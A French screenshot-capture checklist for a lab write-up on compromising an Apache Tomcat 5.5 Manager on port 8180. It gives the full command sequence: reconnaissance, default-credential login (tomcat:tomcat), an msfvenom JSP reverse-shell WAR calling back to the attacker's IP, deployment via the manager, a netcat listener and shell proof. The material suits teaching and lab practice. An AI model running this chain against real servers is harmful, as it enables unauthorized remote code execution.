# Captures — Tomcat Manager (déploiement WAR malveillant, port 8180)

Consignes de capture pour `services/tomcat.html`. Commandes identiques à celles du write-up
source : `ms1/josa/tomcat.md`.

> IP de ce poste (josa, réseau `vboxnet0`) : cible `192.168.56.102`, Kali `192.168.56.1`.
> (Le coéquipier est sur `172.28.128.x` — ses captures à lui utiliseront ses propres IP.)

Chaque capture montre **la commande tapée ET son résultat**, terminal entier, prompt visible.
Les encadrés rouges sont ajoutés après coup (traitement d'image), pas pris dans le terminal.

## 01-recon-nmap.png

Commande :
```bash
nmap -sC -sV -p 8180 192.168.56.102
```

Encadré en rouge : la ligne `8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1` et le
`http-title: Apache Tomcat/5.5` — le footprint qui lance toute la démarche.

## 02-manager-creds.png

Les deux commandes à la suite, dans le même terminal :
```bash
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.102:8180/manager/html
curl -s -o /dev/null -w "%{http_code}\n" -u tomcat:tomcat http://192.168.56.102:8180/manager/html
```

Encadré en rouge : le `200` de la 2e commande (avec `-u tomcat:tomcat`), contre `401` sans
authentification — preuve que les identifiants par défaut ouvrent le manager.

## 03-recherche-module.png

Les deux commandes à la suite (searchsploit, puis info du module) :
```bash
searchsploit tomcat manager
msfconsole -q -x "info exploit/multi/http/tomcat_mgr_deploy; exit"
```

Encadrés en rouge : les lignes `Application Deployer` / `Application Upload` de `searchsploit`
(un exploit connu existe) et le `Name:` du module (`... Authenticated Code Execution`).

## 04-info-cve.png

Suite de la sortie `info` (section Description + References) :
```bash
msfconsole -q -x "info exploit/multi/http/tomcat_mgr_deploy; exit"
```

Encadré en rouge : la ligne `https://nvd.nist.gov/vuln/detail/CVE-2009-3548`. La `Description`
visible juste au-dessus explique le mécanisme (WAR + JSP via requête PUT).

## 05-msfvenom-war.png

Les deux commandes à la suite (génération + inspection du WAR) :
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f war -o shell.war
unzip -l shell.war | grep -i jsp
```

Encadrés en rouge : `Saved as: shell.war` et le nom aléatoire de la JSP embarquée
(`idukjczquyzxqav.jsp` ici — il est différent à chaque génération).

## 06-deploy-war.png

Commande :
```bash
curl -s -u tomcat:tomcat -T shell.war "http://192.168.56.102:8180/manager/deploy?path=/shell"
```

Encadré en rouge : la réponse `OK - Deployed application at context path /shell` — l'application
piégée est en ligne.

## 07-session-shell.png

Capture du terminal du **listener** (gauche), avec le `curl` de déclenchement visible à droite.

- Terminal A (listener, capturé) : `nc -lvnp 4444`
- Terminal B (déclenche) : `curl -s "http://192.168.56.102:8180/shell/idukjczquyzxqav.jsp"`
- Dans A, commandes de preuve : `id`, `whoami`, `hostname`

Encadré en rouge : `uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)` — la preuve
d'accès (shell sur la cible en tant que `tomcat55`).

---

## Après les captures — nettoyage (pas une capture, juste à faire)

```bash
curl -s -u tomcat:tomcat "http://192.168.56.102:8180/manager/undeploy?path=/shell"
```
